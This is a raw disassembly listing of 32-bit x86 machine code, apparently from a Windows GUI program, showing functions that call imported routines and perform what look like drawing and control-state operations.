  4016d4:	51                   	push   %ecx
  4016d5:	89 44 24 14          	mov    %eax,0x14(%esp)
  4016d9:	52                   	push   %edx
  4016da:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4016de:	89 44 24 20          	mov    %eax,0x20(%esp)
  4016e2:	89 44 24 24          	mov    %eax,0x24(%esp)
  4016e6:	ff 15 90 86 41 00    	call   *0x418690
  4016ec:	8a 44 24 10          	mov    0x10(%esp),%al
  4016f0:	8a 4c 24 14          	mov    0x14(%esp),%cl
  4016f4:	8b 57 20             	mov    0x20(%edi),%edx
  4016f7:	68 05 01 00 00       	push   $0x105
  4016fc:	6a 00                	push   $0x0
  4016fe:	02 c0                	add    %al,%al
  401700:	02 c9                	add    %cl,%cl
  401702:	6a 00                	push   $0x0
  401704:	52                   	push   %edx
  401705:	88 87 c1 00 00 00    	mov    %al,0xc1(%edi)
  40170b:	88 8f c0 00 00 00    	mov    %cl,0xc0(%edi)
  401711:	ff 15 94 86 41 00    	call   *0x418694
  401717:	5f                   	pop    %edi
  401718:	5e                   	pop    %esi
  401719:	5b                   	pop    %ebx
  40171a:	83 c4 14             	add    $0x14,%esp
  40171d:	c2 08 00             	ret    $0x8
  401720:	56                   	push   %esi
  401721:	57                   	push   %edi
  401722:	8b f9                	mov    %ecx,%edi
  401724:	8b 47 58             	mov    0x58(%edi),%eax
  401727:	85 c0                	test   %eax,%eax
  401729:	74 07                	je     0x401732
  40172b:	50                   	push   %eax
  40172c:	ff 15 88 86 41 00    	call   *0x418688
  401732:	8b 74 24 0c          	mov    0xc(%esp),%esi
  401736:	c7 47 58 00 00 00 00 	movl   $0x0,0x58(%edi)
  40173d:	83 fe ff             	cmp    $0xffffffff,%esi
  401740:	74 2a                	je     0x40176c
  401742:	81 e6 ff ff 00 00    	and    $0xffff,%esi
  401748:	6a 0c                	push   $0xc
  40174a:	56                   	push   %esi
  40174b:	e8 80 28 01 00       	call   0x413fd0
  401750:	6a 00                	push   $0x0
  401752:	6a 00                	push   $0x0
  401754:	6a 00                	push   $0x0
  401756:	6a 02                	push   $0x2
  401758:	56                   	push   %esi
  401759:	50                   	push   %eax
  40175a:	ff 15 8c 86 41 00    	call   *0x41868c
  401760:	85 c0                	test   %eax,%eax
  401762:	89 47 58             	mov    %eax,0x58(%edi)
  401765:	75 05                	jne    0x40176c
  401767:	5f                   	pop    %edi
  401768:	5e                   	pop    %esi
  401769:	c2 04 00             	ret    $0x4
  40176c:	5f                   	pop    %edi
  40176d:	b8 01 00 00 00       	mov    $0x1,%eax
  401772:	5e                   	pop    %esi
  401773:	c2 04 00             	ret    $0x4
  401776:	90                   	nop
  401777:	90                   	nop
  401778:	90                   	nop
  401779:	90                   	nop
  40177a:	90                   	nop
  40177b:	90                   	nop
  40177c:	90                   	nop
  40177d:	90                   	nop
  40177e:	90                   	nop
  40177f:	90                   	nop
  401780:	83 ec 08             	sub    $0x8,%esp
  401783:	53                   	push   %ebx
  401784:	55                   	push   %ebp
  401785:	56                   	push   %esi
  401786:	57                   	push   %edi
  401787:	8b f1                	mov    %ecx,%esi
  401789:	e8 d2 28 01 00       	call   0x414060
  40178e:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
  401792:	83 e5 01             	and    $0x1,%ebp
  401795:	74 0b                	je     0x4017a2
  401797:	8b 46 50             	mov    0x50(%esi),%eax
  40179a:	85 c0                	test   %eax,%eax
  40179c:	0f 84 d7 00 00 00    	je     0x401879
  4017a2:	8b 46 4c             	mov    0x4c(%esi),%eax
  4017a5:	85 c0                	test   %eax,%eax
  4017a7:	0f 84 cc 00 00 00    	je     0x401879
  4017ad:	ff 15 68 86 41 00    	call   *0x418668
  4017b3:	50                   	push   %eax
  4017b4:	e8 a1 28 01 00       	call   0x41405a
  4017b9:	8b d8                	mov    %eax,%ebx
  4017bb:	8b 46 24             	mov    0x24(%esi),%eax
  4017be:	85 c0                	test   %eax,%eax
  4017c0:	75 0a                	jne    0x4017cc
  4017c2:	8b 46 20             	mov    0x20(%esi),%eax
  4017c5:	50                   	push   %eax
  4017c6:	ff 15 6c 86 41 00    	call   *0x41866c
  4017cc:	50                   	push   %eax
  4017cd:	e8 88 28 01 00       	call   0x41405a
  4017d2:	8b f8                	mov    %eax,%edi
  4017d4:	ff 15 70 86 41 00    	call   *0x418670
  4017da:	50                   	push   %eax
  4017db:	e8 7a 28 01 00       	call   0x41405a
  4017e0:	3b c6                	cmp    %esi,%eax
  4017e2:	74 37                	je     0x40181b
  4017e4:	85 db                	test   %ebx,%ebx
  4017e6:	74 33                	je     0x40181b
  4017e8:	85 ff                	test   %edi,%edi
  4017ea:	74 2f                	je     0x40181b
  4017ec:	8b 4e 20             	mov    0x20(%esi),%ecx
  4017ef:	c7 46 50 01 00 00 00 	movl   $0x1,0x50(%esi)
  4017f6:	51                   	push   %ecx
  4017f7:	ff 15 74 86 41 00    	call   *0x418674
  4017fd:	50                   	push   %eax
  4017fe:	e8 57 28 01 00       	call   0x41405a
  401803:	8b 56 20             	mov    0x20(%esi),%edx
  401806:	6a 01                	push   $0x1
  401808:	6a 00                	push   $0x0
  40180a:	52                   	push   %edx
  40180b:	ff 15 84 86 41 00    	call   *0x418684
  401811:	5f                   	pop    %edi
  401812:	5e                   	pop    %esi
  401813:	5d                   	pop    %ebp
  401814:	5b                   	pop    %ebx
  401815:	83 c4 08             	add    $0x8,%esp
  401818:	c2 0c 00             	ret    $0xc
  40181b:	8b 44 24 20          	mov    0x20(%esp),%eax
  40181f:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  401823:	89 44 24 10          	mov    %eax,0x10(%esp)
  401827:	8b 46 20             	mov    0x20(%esi),%eax
  40182a:	8d 54 24 10          	lea    0x10(%esp),%edx
  40182e:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  401832:	52                   	push   %edx
  401833:	50                   	push   %eax
  401834:	ff 15 78 86 41 00    	call   *0x418678
  40183a:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40183e:	8b 54 24 10          	mov    0x10(%esp),%edx
  401842:	51                   	push   %ecx
  401843:	52                   	push   %edx
  401844:	ff 15 7c 86 41 00    	call   *0x41867c
  40184a:	50                   	push   %eax
  40184b:	e8 0a 28 01 00       	call   0x41405a
  401850:	3b c6                	cmp    %esi,%eax
  401852:	74 25                	je     0x401879
  401854:	83 7e 50 01          	cmpl   $0x1,0x50(%esi)
  401858:	75 15                	jne    0x40186f
  40185a:	8b 46 20             	mov    0x20(%esi),%eax
  40185d:	6a 01                	push   $0x1
  40185f:	6a 00                	push   $0x0
  401861:	50                   	push   %eax
  401862:	c7 46 50 00 00 00 00 	movl   $0x0,0x50(%esi)
  401869:	ff 15 84 86 41 00    	call   *0x418684
  40186f:	85 ed                	test   %ebp,%ebp
  401871:	75 06                	jne    0x401879
  401873:	ff 15 80 86 41 00    	call   *0x418680
  401879:	5f                   	pop    %edi
  40187a:	5e                   	pop    %esi
  40187b:	5d                   	pop    %ebp
  40187c:	5b                   	pop    %ebx
  40187d:	83 c4 08             	add    $0x8,%esp
  401880:	c2 0c 00             	ret    $0xc
  401883:	90                   	nop
  401884:	90                   	nop
  401885:	90                   	nop
  401886:	90                   	nop
  401887:	90                   	nop
  401888:	90                   	nop
  401889:	90                   	nop
  40188a:	90                   	nop
  40188b:	90                   	nop
  40188c:	90                   	nop
  40188d:	90                   	nop
  40188e:	90                   	nop
  40188f:	90                   	nop
  401890:	56                   	push   %esi
  401891:	8b f1                	mov    %ecx,%esi
  401893:	e8 c8 27 01 00       	call   0x414060
  401898:	8b 46 4c             	mov    0x4c(%esi),%eax
  40189b:	85 c0                	test   %eax,%eax
  40189d:	74 1b                	je     0x4018ba
  40189f:	83 7e 50 01          	cmpl   $0x1,0x50(%esi)
  4018a3:	75 15                	jne    0x4018ba
  4018a5:	8b 46 20             	mov    0x20(%esi),%eax
  4018a8:	6a 01                	push   $0x1
  4018aa:	6a 00                	push   $0x0
  4018ac:	50                   	push   %eax
  4018ad:	c7 46 50 00 00 00 00 	movl   $0x0,0x50(%esi)
  4018b4:	ff 15 84 86 41 00    	call   *0x418684
  4018ba:	5e                   	pop    %esi
  4018bb:	c2 04 00             	ret    $0x4
  4018be:	90                   	nop
  4018bf:	90                   	nop
  4018c0:	56                   	push   %esi
  4018c1:	8b f1                	mov    %ecx,%esi
  4018c3:	83 7e 50 01          	cmpl   $0x1,0x50(%esi)
  4018c7:	75 14                	jne    0x4018dd
  4018c9:	ff 15 80 86 41 00    	call   *0x418680
  4018cf:	8b 46 20             	mov    0x20(%esi),%eax
  4018d2:	6a 01                	push   $0x1
  4018d4:	6a 00                	push   $0x0
  4018d6:	50                   	push   %eax
  4018d7:	ff 15 84 86 41 00    	call   *0x418684
  4018dd:	8b ce                	mov    %esi,%ecx
  4018df:	e8 7c 27 01 00       	call   0x414060
  4018e4:	5e                   	pop    %esi
  4018e5:	c2 04 00             	ret    $0x4
  4018e8:	90                   	nop
  4018e9:	90                   	nop
  4018ea:	90                   	nop
  4018eb:	90                   	nop
  4018ec:	90                   	nop
  4018ed:	90                   	nop
  4018ee:	90                   	nop
  4018ef:	90                   	nop
  4018f0:	6a ff                	push   $0xffffffff
  4018f2:	68 f6 4a 41 00       	push   $0x414af6
  4018f7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4018fd:	50                   	push   %eax
  4018fe:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401905:	81 ec 9c 00 00 00    	sub    $0x9c,%esp
  40190b:	53                   	push   %ebx
  40190c:	55                   	push   %ebp
  40190d:	56                   	push   %esi
  40190e:	57                   	push   %edi
  40190f:	8b bc 24 bc 00 00 00 	mov    0xbc(%esp),%edi
  401916:	8b d9                	mov    %ecx,%ebx
  401918:	89 9c 24 98 00 00 00 	mov    %ebx,0x98(%esp)
  40191f:	8b 47 18             	mov    0x18(%edi),%eax
  401922:	50                   	push   %eax
  401923:	e8 fe 27 01 00       	call   0x414126
  401928:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  40192c:	8b f0                	mov    %eax,%esi
  40192e:	e8 fd 26 01 00       	call   0x414030
  401933:	33 ed                	xor    %ebp,%ebp
  401935:	8d 4c 24 3c          	lea    0x3c(%esp),%ecx
  401939:	89 ac 24 b4 00 00 00 	mov    %ebp,0xb4(%esp)
  401940:	e8 7b 10 00 00       	call   0x4029c0
  401945:	c7 44 24 3c 1c 89 41 	movl   $0x41891c,0x3c(%esp)
  40194c:	00 
  40194d:	c7 44 24 2c 20 8a 41 	movl   $0x418a20,0x2c(%esp)
  401954:	00 
  401955:	89 74 24 48          	mov    %esi,0x48(%esp)
  401959:	89 6c 24 44          	mov    %ebp,0x44(%esp)
  40195d:	8b 46 0c             	mov    0xc(%esi),%eax
  401960:	33 c9                	xor    %ecx,%ecx
  401962:	3b c5                	cmp    %ebp,%eax
  401964:	0f 94 c1             	sete   %cl
  401967:	8b c1                	mov    %ecx,%eax
  401969:	c6 84 24 b4 00 00 00 	movb   $0x1,0xb4(%esp)
  401970:	01 
  401971:	3b c5                	cmp    %ebp,%eax
  401973:	89 44 24 5c          	mov    %eax,0x5c(%esp)
  401977:	74 6f                	je     0x4019e8
  401979:	8b 16                	mov    (%esi),%edx
  40197b:	8d 44 24 4c          	lea    0x4c(%esp),%eax
  40197f:	50                   	push   %eax
  401980:	8b ce                	mov    %esi,%ecx
  401982:	ff 52 58             	call   *0x58(%edx)
  401985:	8b 46 04             	mov    0x4(%esi),%eax
  401988:	50                   	push   %eax
  401989:	ff 15 54 80 41 00    	call   *0x418054
  40198f:	50                   	push   %eax
  401990:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  401994:	e8 87 27 01 00       	call   0x414120
  401999:	8b 4c 24 58          	mov    0x58(%esp),%ecx
  40199d:	8b 6c 24 50          	mov    0x50(%esp),%ebp
  4019a1:	8b 54 24 54          	mov    0x54(%esp),%edx
  4019a5:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  4019a9:	2b cd                	sub    %ebp,%ecx
  4019ab:	2b d0                	sub    %eax,%edx
  4019ad:	51                   	push   %ecx
  4019ae:	52                   	push   %edx
  4019af:	56                   	push   %esi
  4019b0:	8d 4c 24 48          	lea    0x48(%esp),%ecx
  4019b4:	e8 97 11 00 00       	call   0x402b50
  4019b9:	8d 44 24 3c          	lea    0x3c(%esp),%eax
  4019bd:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  4019c1:	50                   	push   %eax
  4019c2:	e8 b9 11 00 00       	call   0x402b80
  4019c7:	8b 4c 24 50          	mov    0x50(%esp),%ecx
  4019cb:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  4019cf:	89 44 24 44          	mov    %eax,0x44(%esp)
  4019d3:	51                   	push   %ecx
  4019d4:	8d 84 24 80 00 00 00 	lea    0x80(%esp),%eax
  4019db:	52                   	push   %edx
  4019dc:	50                   	push   %eax
  4019dd:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  4019e1:	e8 34 27 01 00       	call   0x41411a
  4019e6:	eb 15                	jmp    0x4019fd
  4019e8:	8b 4e 0c             	mov    0xc(%esi),%ecx
  4019eb:	89 4c 24 38          	mov    %ecx,0x38(%esp)
  4019ef:	8b 56 04             	mov    0x4(%esi),%edx
  4019f2:	89 54 24 30          	mov    %edx,0x30(%esp)
  4019f6:	8b 46 08             	mov    0x8(%esi),%eax
  4019f9:	89 44 24 34          	mov    %eax,0x34(%esp)
  4019fd:	8b 47 10             	mov    0x10(%edi),%eax
  401a00:	83 c7 1c             	add    $0x1c,%edi
  401a03:	8b c8                	mov    %eax,%ecx
  401a05:	8b e8                	mov    %eax,%ebp
  401a07:	83 e1 10             	and    $0x10,%ecx
  401a0a:	83 e0 04             	and    $0x4,%eax
  401a0d:	89 8c 24 94 00 00 00 	mov    %ecx,0x94(%esp)
  401a14:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  401a18:	57                   	push   %edi
  401a19:	51                   	push   %ecx
  401a1a:	c7 84 24 bc 00 00 00 	movl   $0x2,0xbc(%esp)
  401a21:	02 00 00 00 
  401a25:	83 e5 01             	and    $0x1,%ebp
  401a28:	8b f0                	mov    %eax,%esi
  401a2a:	89 7c 24 70          	mov    %edi,0x70(%esp)
  401a2e:	ff 15 44 86 41 00    	call   *0x418644
  401a34:	8b 43 4c             	mov    0x4c(%ebx),%eax
  401a37:	85 c0                	test   %eax,%eax
  401a39:	75 67                	jne    0x401aa2
  401a3b:	8b 84 24 94 00 00 00 	mov    0x94(%esp),%eax
  401a42:	85 c0                	test   %eax,%eax
  401a44:	75 0c                	jne    0x401a52
  401a46:	8b cb                	mov    %ebx,%ecx
  401a48:	e8 73 0d 00 00       	call   0x4027c0
  401a4d:	83 f8 01             	cmp    $0x1,%eax
  401a50:	75 50                	jne    0x401aa2
  401a52:	6a 00                	push   $0x0
  401a54:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  401a58:	e8 b7 26 01 00       	call   0x414114
  401a5d:	8b 54 24 24          	mov    0x24(%esp),%edx
  401a61:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  401a65:	8d 44 24 10          	lea    0x10(%esp),%eax
  401a69:	52                   	push   %edx
  401a6a:	50                   	push   %eax
  401a6b:	51                   	push   %ecx
  401a6c:	ff 15 48 86 41 00    	call   *0x418648
  401a72:	6a ff                	push   $0xffffffff
  401a74:	8d 54 24 14          	lea    0x14(%esp),%edx
  401a78:	6a ff                	push   $0xffffffff
  401a7a:	52                   	push   %edx
  401a7b:	ff 15 4c 86 41 00    	call   *0x41864c
  401a81:	c7 44 24 20 08 8a 41 	movl   $0x418a08,0x20(%esp)
  401a88:	00 
  401a89:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  401a8d:	c6 84 24 b4 00 00 00 	movb   $0x3,0xb4(%esp)
  401a94:	03 
  401a95:	e8 b4 25 01 00       	call   0x41404e
  401a9a:	c6 84 24 b4 00 00 00 	movb   $0x2,0xb4(%esp)
  401aa1:	02 
  401aa2:	83 7b 50 01          	cmpl   $0x1,0x50(%ebx)
  401aa6:	74 0d                	je     0x401ab5
  401aa8:	85 ed                	test   %ebp,%ebp
  401aaa:	75 09                	jne    0x401ab5
  401aac:	8b cb                	mov    %ebx,%ecx
  401aae:	e8 6d 0b 00 00       	call   0x402620
  401ab3:	eb 07                	jmp    0x401abc
  401ab5:	8b cb                	mov    %ebx,%ecx
  401ab7:	e8 e4 0b 00 00       	call   0x4026a0
  401abc:	50                   	push   %eax
  401abd:	8d 8c 24 a8 00 00 00 	lea    0xa8(%esp),%ecx
  401ac4:	e8 4b 26 01 00       	call   0x414114
  401ac9:	8b 83 e0 00 00 00    	mov    0xe0(%ebx),%eax
  401acf:	c6 84 24 b4 00 00 00 	movb   $0x4,0xb4(%esp)
  401ad6:	04 
  401ad7:	83 f8 01             	cmp    $0x1,%eax
  401ada:	75 0e                	jne    0x401aea
  401adc:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  401ae0:	8b cb                	mov    %ebx,%ecx
  401ae2:	50                   	push   %eax
  401ae3:	e8 18 0d 00 00       	call   0x402800
  401ae8:	eb 18                	jmp    0x401b02
  401aea:	8b 8c 24 a8 00 00 00 	mov    0xa8(%esp),%ecx
  401af1:	8b 44 24 30          	mov    0x30(%esp),%eax
  401af5:	8d 54 24 10          	lea    0x10(%esp),%edx
  401af9:	51                   	push   %ecx
  401afa:	52                   	push   %edx
  401afb:	50                   	push   %eax
  401afc:	ff 15 50 86 41 00    	call   *0x418650
  401b02:	85 ed                	test   %ebp,%ebp
  401b04:	0f 84 7e 01 00 00    	je     0x401c88
  401b0a:	8b 4b 4c             	mov    0x4c(%ebx),%ecx
  401b0d:	b8 01 00 00 00       	mov    $0x1,%eax
  401b12:	3b c8                	cmp    %eax,%ecx
  401b14:	0f 85 29 01 00 00    	jne    0x401c43
  401b1a:	39 43 48             	cmp    %eax,0x48(%ebx)
  401b1d:	0f 85 a1 04 00 00    	jne    0x401fc4
  401b23:	8b 3d 54 86 41 00    	mov    0x418654,%edi
  401b29:	6a 14                	push   $0x14
  401b2b:	ff d7                	call   *%edi
  401b2d:	50                   	push   %eax
  401b2e:	6a 00                	push   $0x0
  401b30:	6a 00                	push   $0x0
  401b32:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  401b36:	e8 d3 25 01 00       	call   0x41410e
  401b3b:	6a 10                	push   $0x10
  401b3d:	c6 84 24 b8 00 00 00 	movb   $0x5,0xb8(%esp)
  401b44:	05 
  401b45:	ff d7                	call   *%edi
  401b47:	50                   	push   %eax
  401b48:	6a 00                	push   $0x0
  401b4a:	6a 00                	push   $0x0
  401b4c:	8d 4c 24 6c          	lea    0x6c(%esp),%ecx
  401b50:	e8 b9 25 01 00       	call   0x41410e
  401b55:	8d 4c 24 60          	lea    0x60(%esp),%ecx
  401b59:	c6 84 24 b4 00 00 00 	movb   $0x6,0xb4(%esp)
  401b60:	06 
  401b61:	51                   	push   %ecx
  401b62:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  401b66:	e8 9d 25 01 00       	call   0x414108
  401b6b:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  401b6f:	8b f8                	mov    %eax,%edi
  401b71:	8b 44 24 10          	mov    0x10(%esp),%eax
  401b75:	4a                   	dec    %edx
  401b76:	52                   	push   %edx
  401b77:	8d 8c 24 80 00 00 00 	lea    0x80(%esp),%ecx
  401b7e:	50                   	push   %eax
  401b7f:	51                   	push   %ecx
  401b80:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  401b84:	e8 79 25 01 00       	call   0x414102
  401b89:	8b 54 24 14          	mov    0x14(%esp),%edx
  401b8d:	8b 44 24 10          	mov    0x10(%esp),%eax
  401b91:	52                   	push   %edx
  401b92:	50                   	push   %eax
  401b93:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  401b97:	e8 60 25 01 00       	call   0x4140fc
  401b9c:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  401ba0:	8b 54 24 18          	mov    0x18(%esp),%edx
  401ba4:	51                   	push   %ecx
  401ba5:	52                   	push   %edx
  401ba6:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  401baa:	e8 4d 25 01 00       	call   0x4140fc
  401baf:	8b 44 24 24          	mov    0x24(%esp),%eax
  401bb3:	85 c0                	test   %eax,%eax
  401bb5:	74 0c                	je     0x401bc3
  401bb7:	50                   	push   %eax
  401bb8:	8b 44 24 34          	mov    0x34(%esp),%eax
  401bbc:	50                   	push   %eax
  401bbd:	ff 15 58 80 41 00    	call   *0x418058
  401bc3:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  401bc7:	8b 54 24 10          	mov    0x10(%esp),%edx
  401bcb:	49                   	dec    %ecx
  401bcc:	8d 44 24 7c          	lea    0x7c(%esp),%eax
  401bd0:	51                   	push   %ecx
  401bd1:	52                   	push   %edx
  401bd2:	50                   	push   %eax
  401bd3:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  401bd7:	e8 26 25 01 00       	call   0x414102
  401bdc:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  401be0:	8b 54 24 18          	mov    0x18(%esp),%edx
  401be4:	49                   	dec    %ecx
  401be5:	4a                   	dec    %edx
  401be6:	51                   	push   %ecx
  401be7:	52                   	push   %edx
  401be8:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  401bec:	e8 0b 25 01 00       	call   0x4140fc
  401bf1:	8b 44 24 14          	mov    0x14(%esp),%eax
  401bf5:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  401bf9:	48                   	dec    %eax
  401bfa:	49                   	dec    %ecx
  401bfb:	50                   	push   %eax
  401bfc:	51                   	push   %ecx
  401bfd:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  401c01:	e8 f6 24 01 00       	call   0x4140fc
  401c06:	57                   	push   %edi
  401c07:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  401c0b:	e8 f8 24 01 00       	call   0x414108
  401c10:	bf 08 8a 41 00       	mov    $0x418a08,%edi
  401c15:	89 7c 24 60          	mov    %edi,0x60(%esp)
  401c19:	8d 4c 24 60          	lea    0x60(%esp),%ecx
  401c1d:	c6 84 24 b4 00 00 00 	movb   $0x7,0xb4(%esp)
  401c24:	07 
  401c25:	e8 24 24 01 00       	call   0x41404e
  401c2a:	c7 44 24 60 f4 89 41 	movl   $0x4189f4,0x60(%esp)
  401c31:	00 
  401c32:	89 7c 24 20          	mov    %edi,0x20(%esp)
  401c36:	c6 84 24 b4 00 00 00 	movb   $0x8,0xb4(%esp)
  401c3d:	08 
  401c3e:	e9 6c 03 00 00       	jmp    0x401faf
  401c43:	6a 10                	push   $0x10
  401c45:	ff 15 54 86 41 00    	call   *0x418654
  401c4b:	50                   	push   %eax
  401c4c:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  401c50:	e8 bf 24 01 00       	call   0x414114
  401c55:	8b 54 24 24          	mov    0x24(%esp),%edx
  401c59:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  401c5d:	8d 44 24 10          	lea    0x10(%esp),%eax
  401c61:	52                   	push   %edx
  401c62:	50                   	push   %eax
  401c63:	51                   	push   %ecx
  401c64:	ff 15 48 86 41 00    	call   *0x418648
  401c6a:	c7 44 24 20 08 8a 41 	movl   $0x418a08,0x20(%esp)
  401c71:	00 
  401c72:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  401c76:	c6 84 24 b4 00 00 00 	movb   $0x9,0xb4(%esp)
  401c7d:	09 
  401c7e:	e8 cb 23 01 00       	call   0x41404e
  401c83:	e9 34 03 00 00       	jmp    0x401fbc
  401c88:	8b 3d 54 86 41 00    	mov    0x418654,%edi
  401c8e:	6a 14                	push   $0x14
  401c90:	ff d7                	call   *%edi
  401c92:	50                   	push   %eax
  401c93:	6a 00                	push   $0x0
  401c95:	6a 00                	push   $0x0
  401c97:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  401c9b:	e8 6e 24 01 00       	call   0x41410e
  401ca0:	6a 16                	push   $0x16
  401ca2:	c6 84 24 b8 00 00 00 	movb   $0xa,0xb8(%esp)
  401ca9:	0a 
  401caa:	ff d7                	call   *%edi
  401cac:	50                   	push   %eax
  401cad:	6a 00                	push   $0x0
  401caf:	6a 00                	push   $0x0
  401cb1:	8d 8c 24 88 00 00 00 	lea    0x88(%esp),%ecx
  401cb8:	e8 51 24 01 00       	call   0x41410e
  401cbd:	6a 10                	push   $0x10
  401cbf:	c6 84 24 b8 00 00 00 	movb   $0xb,0xb8(%esp)
  401cc6:	0b 
  401cc7:	ff d7                	call   *%edi
  401cc9:	50                   	push   %eax
  401cca:	6a 00                	push   $0x0
  401ccc:	6a 00                	push   $0x0
  401cce:	8d 4c 24 6c          	lea    0x6c(%esp),%ecx
  401cd2:	e8 37 24 01 00       	call   0x41410e
  401cd7:	6a 15                	push   $0x15
  401cd9:	c6 84 24 b8 00 00 00 	movb   $0xc,0xb8(%esp)
  401ce0:	0c 
  401ce1:	ff d7                	call   *%edi
  401ce3:	50                   	push   %eax
  401ce4:	6a 00                	push   $0x0
  401ce6:	6a 00                	push   $0x0
  401ce8:	8d 8c 24 a8 00 00 00 	lea    0xa8(%esp),%ecx
  401cef:	e8 1a 24 01 00       	call   0x41410e
  401cf4:	8b 4b 4c             	mov    0x4c(%ebx),%ecx
  401cf7:	b8 01 00 00 00       	mov    $0x1,%eax
  401cfc:	3b c8                	cmp    %eax,%ecx
  401cfe:	c6 84 24 b4 00 00 00 	movb   $0xd,0xb4(%esp)
  401d05:	0d 
  401d06:	0f 85 ba 00 00 00    	jne    0x401dc6
  401d0c:	39 43 50             	cmp    %eax,0x50(%ebx)
  401d0f:	0f 85 29 02 00 00    	jne    0x401f3e
  401d15:	39 43 48             	cmp    %eax,0x48(%ebx)
  401d18:	0f 85 20 02 00 00    	jne    0x401f3e
  401d1e:	8d 54 24 20          	lea    0x20(%esp),%edx
  401d22:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  401d26:	52                   	push   %edx
  401d27:	e8 dc 23 01 00       	call   0x414108
  401d2c:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  401d30:	8b f8                	mov    %eax,%edi
  401d32:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  401d36:	8d 94 24 84 00 00 00 	lea    0x84(%esp),%edx
  401d3d:	48                   	dec    %eax
  401d3e:	50                   	push   %eax
  401d3f:	51                   	push   %ecx
  401d40:	52                   	push   %edx
  401d41:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  401d45:	e8 b8 23 01 00       	call   0x414102
  401d4a:	8b 44 24 14          	mov    0x14(%esp),%eax
  401d4e:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  401d52:	50                   	push   %eax
  401d53:	51                   	push   %ecx
  401d54:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  401d58:	e8 9f 23 01 00       	call   0x4140fc
  401d5d:	8b 54 24 14          	mov    0x14(%esp),%edx
  401d61:	8b 44 24 18          	mov    0x18(%esp),%eax
  401d65:	52                   	push   %edx
  401d66:	50                   	push   %eax
  401d67:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  401d6b:	e8 8c 23 01 00       	call   0x4140fc
  401d70:	8b 44 24 64          	mov    0x64(%esp),%eax
  401d74:	85 c0                	test   %eax,%eax
  401d76:	74 0c                	je     0x401d84
  401d78:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  401d7c:	50                   	push   %eax
  401d7d:	51                   	push   %ecx
  401d7e:	ff 15 58 80 41 00    	call   *0x418058
  401d84:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  401d88:	8b 44 24 10          	mov    0x10(%esp),%eax
  401d8c:	4a                   	dec    %edx
  401d8d:	8d 8c 24 84 00 00 00 	lea    0x84(%esp),%ecx
  401d94:	52                   	push   %edx
  401d95:	50                   	push   %eax
  401d96:	51                   	push   %ecx
  401d97:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  401d9b:	e8 62 23 01 00       	call   0x414102
  401da0:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  401da4:	8b 44 24 18          	mov    0x18(%esp),%eax
  401da8:	4a                   	dec    %edx
  401da9:	48                   	dec    %eax
  401daa:	52                   	push   %edx
  401dab:	50                   	push   %eax
  401dac:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  401db0:	e8 47 23 01 00       	call   0x4140fc
  401db5:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  401db9:	8b 54 24 18          	mov    0x18(%esp),%edx
  401dbd:	49                   	dec    %ecx
  401dbe:	4a                   	dec    %edx
  401dbf:	51                   	push   %ecx
  401dc0:	52                   	push   %edx
  401dc1:	e9 65 01 00 00       	jmp    0x401f2b
  401dc6:	8d 44 24 20          	lea    0x20(%esp),%eax
  401dca:	8d 4c 24 2c          	lea    0x2c(%esp),%ecx
  401dce:	50                   	push   %eax
  401dcf:	e8 34 23 01 00       	call   0x414108
  401dd4:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  401dd8:	8b 54 24 10          	mov    0x10(%esp),%edx
  401ddc:	49                   	dec    %ecx
  401ddd:	8b f8                	mov    %eax,%edi
  401ddf:	51                   	push   %ecx
  401de0:	8d 84 24 88 00 00 00 	lea    0x88(%esp),%eax
  401de7:	52                   	push   %edx
  401de8:	50                   	push   %eax
  401de9:	8d 4c 24 38          	lea    0x38(%esp),%ecx
  401ded:	e8 10 23 01 00       	call   0x414102
  401df2:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  401df6:	8b 54 24 10          	mov    0x10(%esp),%edx
  401dfa:	51                   	push   %ecx
  401dfb:	52                   	push   %edx
  401dfc:	8d 4c 24 34          	lea    0x34(%esp),%ecx
  401e00:	e8 f7 22 01 00       	call   0x4140fc
